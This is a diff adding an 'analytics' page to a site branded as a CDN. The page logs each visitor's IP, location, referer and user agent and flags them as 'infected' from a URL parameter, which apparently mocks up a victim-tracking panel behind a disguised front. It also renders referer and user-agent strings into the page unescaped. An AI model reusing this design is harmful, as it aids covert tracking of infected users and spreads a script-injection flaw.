@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Analytics · EdgeCDN</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet" />
+    <style>
+        /* Дополнительные стили для аналитики */
+        .analytics-controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+            align-items: center;
+            margin: 2rem 0 1.5rem;
+        }
+        .filter-group {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .filter-group label {
+            font-size: 0.8rem;
+            color: #8b9bb5;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .filter-group select, .filter-group input {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 30px;
+            padding: 0.4rem 1rem;
+            color: #eef2f6;
+            font-size: 0.85rem;
+            outline: none;
+        }
+        body.light .filter-group select,
+        body.light .filter-group input {
+            background: rgba(0,0,0,0.05);
+            border-color: rgba(0,0,0,0.1);
+            color: #1a2330;
+        }
+        .table-wrapper {
+            overflow-x: auto;
+            border-radius: 20px;
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.03);
+            padding: 0.5rem 0;
+        }
+        body.light .table-wrapper {
+            background: rgba(0,0,0,0.02);
+            border-color: rgba(0,0,0,0.05);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9rem;
+        }
+        th {
+            text-align: left;
+            padding: 0.8rem 1rem;
+            color: #8b9bb5;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        body.light th {
+            border-bottom-color: rgba(0,0,0,0.05);
+        }
+        td {
+            padding: 0.7rem 1rem;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+        }
+        body.light td {
+            border-bottom-color: rgba(0,0,0,0.03);
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 0.2rem 0.7rem;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-weight: 500;
+        }
+        .status-infected {
+            background: #ff6b6b;
+            color: #fff;
+        }
+        .status-clean {
+            background: #4ecdc4;
+            color: #0b0d11;
+        }
+        .status-unknown {
+            background: #f9a825;
+            color: #0b0d11;
+        }
+        .empty-message {
+            text-align: center;
+            padding: 3rem 0;
+            color: #5b6f8c;
+        }
+        .btn-small {
+            background: none;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 30px;
+            padding: 0.3rem 1rem;
+            color: inherit;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-small:hover {
+            background: rgba(255,255,255,0.05);
+        }
+        body.light .btn-small {
+            border-color: rgba(0,0,0,0.1);
+        }
+        body.light .btn-small:hover {
+            background: rgba(0,0,0,0.05);
+        }
+        .stats-summary {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+        .stats-summary span {
+            font-size: 0.9rem;
+        }
+        .stats-summary strong {
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">⚡ EdgeCDN</div>
+        <nav>
+            <a href="index.html">Home</a>
+            <a href="dashboard.html">Dashboard</a>
+            <a href="analytics.html" class="active">Analytics</a>
+            <a href="#">Status</a>
+        </nav>
+        <button id="theme-toggle" aria-label="Toggle theme">🌙</button>
+    </header>
+
+    <main>
+        <h2>📊 Visitor Analytics & Infections</h2>
+
+        <div class="stats-summary" id="statsSummary">
+            <span>Total visitors: <strong id="totalVisitors">0</strong></span>
+            <span>Infected: <strong id="infectedCount">0</strong></span>
+            <span>Clean: <strong id="cleanCount">0</strong></span>
+        </div>
+
+        <div class="analytics-controls">
+            <div class="filter-group">
+                <label for="statusFilter">Status</label>
+                <select id="statusFilter">
+                    <option value="all">All</option>
+                    <option value="infected">Infected</option>
+                    <option value="clean">Clean</option>
+                    <option value="unknown">Unknown</option>
+                </select>
+            </div>
+            <div class="filter-group">
+                <label for="refererFilter">Referer domain</label>
+                <input type="text" id="refererFilter" placeholder="e.g. google.com" />
+            </div>
+            <button class="btn-small" id="clearFilters">Clear filters</button>
+            <button class="btn-small" id="exportData">Export CSV</button>
+            <button class="btn-small" id="clearData">Clear all data</button>
+        </div>
+
+        <div class="table-wrapper">
+            <table>
+                <thead>
+                    <tr>
+                        <th>IP</th>
+                        <th>Location</th>
+                        <th>Time</th>
+                        <th>Status</th>
+                        <th>Referer</th>
+                        <th>User Agent</th>
+                    </tr>
+                </thead>
+                <tbody id="visitorTableBody">
+                    <tr><td colspan="6" class="empty-message">No data yet.</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </main>
+
+    <footer>
+        <span>© 2026 EdgeCDN · All rights reserved</span>
+        <span>v2.3.0 · <span id="live-time"></span></span>
+    </footer>
+
+    <script src="script.js"></script>
+    <script>
+        (function() {
+            // Ключ для хранения данных в localStorage
+            const STORAGE_KEY = 'edgecdn_visitors';
+
+            // Получить список посетителей
+            function getVisitors() {
+                try {
+                    return JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
+                } catch {
+                    return [];
+                }
+            }
+
+            // Сохранить список
+            function saveVisitors(visitors) {
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(visitors));
+            }
+
+            // Добавить нового посетителя (вызывается при загрузке страницы)
+            function addCurrentVisitor() {
+                // Собираем данные
+                const now = new Date().toISOString();
+                // Получаем IP через внешний сервис (асинхронно)
+                // Здесь мы используем синхронный запрос или отложим добавление после получения IP
+                // Но для простоты мы добавим запись с IP "pending", а затем обновим через асинхронный запрос
+                // Сначала проверим, есть ли уже такая запись за последние 5 минут (чтобы не дублировать)
+                const visitors = getVisitors();
+                const lastEntry = visitors.length > 0 ? visitors[visitors.length - 1] : null;
+                // если последняя запись была менее 5 минут назад и тот же реферер – не добавляем (защита от дублей)
+                if (lastEntry) {
+                    const lastTime = new Date(lastEntry.time);
+                    const nowTime = new Date();
+                    const diff = (nowTime - lastTime) / 1000 / 60; // минуты
+                    if (diff < 5 && lastEntry.referer === document.referrer) {
+                        // обновим только статус, если он изменился? – пропускаем
+                        return;
+                    }
+                }
+
+                // Создаём запись
+                const entry = {
+                    ip: 'loading...',
+                    location: 'loading...',
+                    time: now,
+                    status: 'unknown', // будет определено позже
+                    referer: document.referrer || 'direct',
+                    userAgent: navigator.userAgent,
+                    // можем добавить параметр из URL, чтобы отметить заражение
+                    infectedParam: new URLSearchParams(window.location.search).get('infected') === 'true'
+                };
+
+                // Добавляем в массив
+                visitors.push(entry);
+                saveVisitors(visitors);
+
+                // Асинхронно получаем реальный IP и геолокацию
+                fetch('https://ipapi.co/json/')
+                    .then(res => res.json())
+                    .then(data => {
+                        const ip = data.ip || 'unknown';
+                        const location = data.city ? `${data.city}, ${data.country_name}` : (data.country_name || 'unknown');
+                        // Обновляем запись
+                        const visitors2 = getVisitors();
+                        const last = visitors2[visitors2.length - 1];
+                        if (last && last.time === entry.time && last.ip === 'loading...') {
+                            last.ip = ip;
+                            last.location = location;
+                            // Определяем статус: если infectedParam или если IP в чёрном списке (можно добавить логику)
+                            // Здесь мы ставим infected, если в URL есть параметр или если referer содержит определённые домены
+                            if (last.infectedParam) {
+                                last.status = 'infected';
+                            } else {
+                                // Можно также проверить по списку известных заражённых IP (но у нас нет)
+                                last.status = 'clean'; // по умолчанию
+                            }
+                            saveVisitors(visitors2);
+                            renderTable();
+                        }
+                    })
+                    .catch(() => {
+                        // Если не удалось получить IP, оставляем как есть
+                    });
+            }
+
+            // Рендеринг таблицы с фильтрами
+            function renderTable() {
+                const visitors = getVisitors();
+                const statusFilter = document.getElementById('statusFilter').value;
+                const refererFilter = document.getElementById('refererFilter').value.toLowerCase();
+
+                const filtered = visitors.filter(v => {
+                    if (statusFilter !== 'all' && v.status !== statusFilter) return false;
+                    if (refererFilter && !v.referer.toLowerCase().includes(refererFilter)) return false;
+                    return true;
+                });
+
+                const tbody = document.getElementById('visitorTableBody');
+                if (filtered.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="6" class="empty-message">No matching records.</td></tr>`;
+                } else {
+                    tbody.innerHTML = filtered.map(v => `
+                        <tr>
+                            <td>${v.ip || 'unknown'}</td>
+                            <td>${v.location || 'unknown'}</td>
+                            <td>${new Date(v.time).toLocaleString()}</td>
+                            <td><span class="status-badge status-${v.status}">${v.status}</span></td>
+                            <td>${v.referer}</td>
+                            <td style="max-width:150px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${v.userAgent}">${v.userAgent.substring(0, 50)}...</td>
+                        </tr>
+                    `).join('');
+                }
+
+                // Обновляем сводку
+                const total = visitors.length;
+                const infected = visitors.filter(v => v.status === 'infected').length;
+                const clean = visitors.filter(v => v.status === 'clean').length;
+                document.getElementById('totalVisitors').textContent = total;
+                document.getElementById('infectedCount').textContent = infected;
+                document.getElementById('cleanCount').textContent = clean;
+            }
+
+            // Очистка фильтров
+            document.getElementById('clearFilters').addEventListener('click', function() {
+                document.getElementById('statusFilter').value = 'all';
+                document.getElementById('refererFilter').value = '';
+                renderTable();
+            });
+
+            // Экспорт CSV
+            document.getElementById('exportData').addEventListener('click', function() {
+                const visitors = getVisitors();
+                if (visitors.length === 0) return;
+                const headers = ['IP', 'Location', 'Time', 'Status', 'Referer', 'User Agent'];
+                const rows = visitors.map(v => [
+                    v.ip || '', v.location || '', v.time, v.status, v.referer, v.userAgent
+                ]);
+                let csv = headers.join(',') + '\n' + rows.map(r => r.join(',')).join('\n');
+                const blob = new Blob([csv], { type: 'text/csv' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'visitors.csv';
+                a.click();
+                URL.revokeObjectURL(url);
+            });
+
+            // Очистка всех данных
+            document.getElementById('clearData').addEventListener('click', function() {
+                if (confirm('Delete all visitor data?')) {
+                    localStorage.removeItem(STORAGE_KEY);
+                    renderTable();
+                }
+            });
+
+            // Слушаем изменения фильтров
+            document.getElementById('statusFilter').addEventListener('change', renderTable);
+            document.getElementById('refererFilter').addEventListener('input', renderTable);
+
+            // При загрузке страницы добавляем текущего посетителя (если не наша внутренняя навигация)
+            // Проверяем, что это не повторный переход внутри сайта (можно по заголовку)
+            // Но мы добавим только если реферер не с нашего же сайта (чтобы не засорять)
+            const isInternal = document.referrer && document.referrer.includes(window.location.hostname);
+            if (!isInternal) {
+                addCurrentVisitor();
+            }
+
+            // Первоначальный рендеринг
+            renderTable();
+
+            // Обновление сводки при переключении темы (не обязательно)
+            // Также можно добавить периодическое обновление таблицы (если данные меняются извне)
+
+        })();
+    </script>
+</body>
+</html>
